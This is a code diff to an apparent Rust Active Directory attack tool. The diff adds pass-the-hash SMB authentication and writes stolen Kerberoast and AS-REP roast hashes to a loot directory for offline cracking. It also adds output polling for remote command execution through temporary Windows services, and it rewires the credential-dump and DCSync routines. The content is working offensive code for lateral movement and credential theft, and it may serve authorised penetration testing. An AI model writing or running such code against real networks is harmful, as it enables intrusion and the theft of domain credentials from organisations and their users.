@@ -331,6 +331,29 @@ async fn ldap_connect(ctx: &ExecContext, state: &EngagementState) -> std::result
 }
 
 // ═══════════════════════════════════════════════════════════
+// SMB Connection Helper (pass-the-hash aware)
+// ═══════════════════════════════════════════════════════════
+
+/// Connect to a target via SMB, correctly handling pass-the-hash mode.
+/// When `use_hash` is true, calls `SmbSession::connect_with_hash()` instead
+/// of `SmbSession::connect()` so the NT hash is used for NTLMv2 auth
+/// rather than being sent as a literal password string.
+async fn smb_connect(ctx: &ExecContext, target: &str) -> std::result::Result<SmbSession, StepResult> {
+    let (user, secret, use_hash) = ctx.effective_creds();
+    let result = if use_hash {
+        SmbSession::connect_with_hash(target, &ctx.domain, user, secret).await
+    } else {
+        SmbSession::connect(target, &ctx.domain, user, secret).await
+    };
+    result.map_err(|e| StepResult {
+        success: false,
+        output: format!("SMB connect to {}: {e}", target),
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    })
+}
+
+// ═══════════════════════════════════════════════════════════
 // Enumeration Executors
 // ═══════════════════════════════════════════════════════════
 
@@ -659,8 +682,7 @@ async fn exec_enumerate_shares(
     _state: &mut EngagementState,
     target: &str,
 ) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
-    match SmbSession::connect(target, &ctx.domain, user, pass).await {
+    match smb_connect(ctx, target).await {
         Ok(smb) => {
             let shares = smb
                 .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON"])
@@ -684,12 +706,7 @@ async fn exec_enumerate_shares(
                 new_admin_hosts: 0,
             }
         }
-        Err(e) => StepResult {
-            success: false,
-            output: format!("SMB to {}: {e}", target),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => e,
     }
 }
 
@@ -698,11 +715,10 @@ async fn exec_check_admin(
     state: &mut EngagementState,
     targets: &[String],
 ) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
     let mut new_admin = 0;
 
     for target in targets {
-        match SmbSession::connect(target, &ctx.domain, user, pass).await {
+        match smb_connect(ctx, target).await {
             Ok(smb) => {
                 let result = smb.check_admin_access().await;
                 if result.has_admin {
@@ -712,7 +728,7 @@ async fn exec_check_admin(
                 }
             }
             Err(e) => {
-                debug!("{} {} {}", "  ✗".dimmed(), target, e);
+                debug!("  ✗ {} — {}", target, e.output);
             }
         }
         ctx.jitter().await;
@@ -780,8 +796,9 @@ async fn exec_kerberoast(
 
         for spn in &spns {
             match kerberos::kerberoast(&ctx.dc_ip, &tgt, spn).await {
-                Ok(_hash) => {
+                Ok(hash) => {
                     info!("  {} Kerberoast hash: {} ({})", "✓".green(), account.bold(), spn);
+                    state.roast_hashes.push(hash.hash_string.clone());
                     hash_count += 1;
                     break; // One hash per account is sufficient
                 }
@@ -791,6 +808,29 @@ async fn exec_kerberoast(
             }
         }
         ctx.jitter().await;
+    }
+
+    // Write hashes to loot directory for offline cracking
+    if hash_count > 0 {
+        let loot_dir = std::path::PathBuf::from("./loot");
+        let _ = std::fs::create_dir_all(&loot_dir);
+        let hash_file = loot_dir.join("kerberoast_hashes.txt");
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&hash_file)
+        {
+            use std::io::Write;
+            for h in state.roast_hashes.iter().skip(state.roast_hashes.len().saturating_sub(hash_count)) {
+                let _ = writeln!(f, "{}", h);
+            }
+            info!(
+                "  {} Wrote {} hashes to {}",
+                "→".cyan(),
+                hash_count,
+                hash_file.display()
+            );
+        }
     }
 
     let msg = format!(
@@ -824,8 +864,9 @@ async fn exec_asrep_roast(
     let mut hash_count = 0;
     for user in &targets {
         match kerberos::asrep_roast(&ctx.dc_ip, &ctx.domain, user).await {
-            Ok(_hash) => {
+            Ok(hash) => {
                 info!("  {} AS-REP hash: {}", "✓".green(), user.bold());
+                state.roast_hashes.push(hash.hash_string.clone());
                 hash_count += 1;
             }
             Err(e) => {
@@ -833,6 +874,29 @@ async fn exec_asrep_roast(
             }
         }
         ctx.jitter().await;
+    }
+
+    // Write AS-REP hashes to loot directory
+    if hash_count > 0 {
+        let loot_dir = std::path::PathBuf::from("./loot");
+        let _ = std::fs::create_dir_all(&loot_dir);
+        let hash_file = loot_dir.join("asrep_hashes.txt");
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&hash_file)
+        {
+            use std::io::Write;
+            for h in state.roast_hashes.iter().skip(state.roast_hashes.len().saturating_sub(hash_count)) {
+                let _ = writeln!(f, "{}", h);
+            }
+            info!(
+                "  {} Wrote {} hashes to {}",
+                "→".cyan(),
+                hash_count,
+                hash_file.display()
+            );
+        }
     }
 
     let msg = format!(
@@ -1641,18 +1705,10 @@ async fn exec_remote(
         command.yellow(),
         method.cyan()
     );
-    let (user, pass, _) = ctx.effective_creds();
 
-    let smb = match SmbSession::connect(target, &ctx.domain, user, pass).await {
+    let smb = match smb_connect(ctx, target).await {
         Ok(s) => s,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("SMB connect to {}: {e}", target),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     // Build service command that writes output to a temp file
@@ -1665,15 +1721,30 @@ async fn exec_remote(
     let svc_name = format!("OT{:08X}", rand::random::<u32>());
     match create_and_start_service(&smb, &svc_name, &svc_cmd).await {
         Ok(()) => {
-            // Wait for execution
-            tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
-
-            // Read output — ADMIN$ maps to C:\Windows, so Temp\{hex}.tmp
+            // Poll for command output with exponential backoff
+            // Instead of a fixed 2s sleep that races on slow targets
             let share_path = format!("Temp\\{}.tmp", output_hex);
-            let output = match smb.read_file("ADMIN$", &share_path).await {
-                Ok(data) => String::from_utf8_lossy(&data).to_string(),
-                Err(_) => "(output not captured)".to_string(),
-            };
+            let mut output = String::new();
+            let delays = [1000u64, 1500, 2000, 3000, 5000]; // ms
+            for (attempt, &delay_ms) in delays.iter().enumerate() {
+                tokio::time::sleep(tokio::time::Duration::from_millis(delay_ms)).await;
+                match smb.read_file("ADMIN$", &share_path).await {
+                    Ok(data) if !data.is_empty() => {
+                        output = String::from_utf8_lossy(&data).to_string();
+                        debug!("  Output captured on attempt {} ({} bytes)", attempt + 1, data.len());
+                        break;
+                    }
+                    Ok(_) => {
+                        debug!("  Output file empty on attempt {}, retrying...", attempt + 1);
+                    }
+                    Err(_) if attempt < delays.len() - 1 => {
+                        debug!("  Output file not ready on attempt {}, retrying...", attempt + 1);
+                    }
+                    Err(_) => {
+                        output = "(output not captured — command may still be running)".to_string();
+                    }
+                }
+            }
 
             // Cleanup — delete service & output file
             let _ = delete_service(&smb, &svc_name).await;
@@ -1968,18 +2039,10 @@ async fn exec_dump(
         "{}",
         format!("  Dumping {} from {}", dump_type, target).red()
     );
-    let (user, pass, _) = ctx.effective_creds();
 
-    let smb = match SmbSession::connect(target, &ctx.domain, user, pass).await {
+    let smb = match smb_connect(ctx, target).await {
         Ok(s) => s,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("SMB connect to {}: {e}", target),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     // Step 1: Start RemoteRegistry service (may already be running)
@@ -2310,19 +2373,10 @@ async fn exec_dcsync(
             .bold()
     );
 
-    let (user, pass, _) = ctx.effective_creds();
-
     // Step 1: Connect SMB to DC for RPC transport
-    let smb = match SmbSession::connect(&ctx.dc_ip, &ctx.domain, user, pass).await {
+    let smb = match smb_connect(ctx, &ctx.dc_ip.clone()).await {
         Ok(s) => s,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("SMB connect to DC: {e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     // Step 2: RPC Bind to MS-DRSR (drsuapi pipe)
@@ -2459,6 +2513,7 @@ async fn exec_dcsync(
     // Derive session key for DRS attribute decryption.
     // Prefer the real NTLM session key from the SMB authentication exchange.
     // Fall back to computing ResponseKeyNT (NTLMv2 hash) from credentials.
+    let (user, pass, _use_hash) = ctx.effective_creds();
     let session_key: Vec<u8> = if let Some(sk) = smb.session_key() {
         info!("  Using NTLM session key from SMB auth ({} bytes)", sk.len());
         sk
